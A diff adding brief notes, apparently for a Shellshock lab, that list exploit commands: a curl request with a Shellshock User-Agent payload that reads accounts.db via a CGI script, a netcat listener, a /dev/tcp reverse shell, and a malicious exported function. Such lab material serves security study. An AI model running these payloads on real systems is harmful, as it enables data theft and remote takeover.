@@ -1,0 +1,27 @@
+Initial Setup
+=============
+
+Making /bin/sh point to /bin/bash
+=================================
+
+sudo ln -sf /bin/bash /bin/sh
+
+Accessing private data using curl
+=================================
+
+curl -A "() { :; }; echo; echo; /bin/cat accounts.db" http://server_ip/cgi-bin/test.cgi
+
+Creating a process waiting for connection on port 7070 on victim machine
+========================================================================
+
+nc -l 7070 -v
+
+Running a reverse shell
+=======================
+
+/bin/bash -i > /dev/tcp/client_ip/7070 0<&1 2>&1
+
+
+Exporting a function definition 
+===============================
+export foo='() { :; }; /bin/sh'
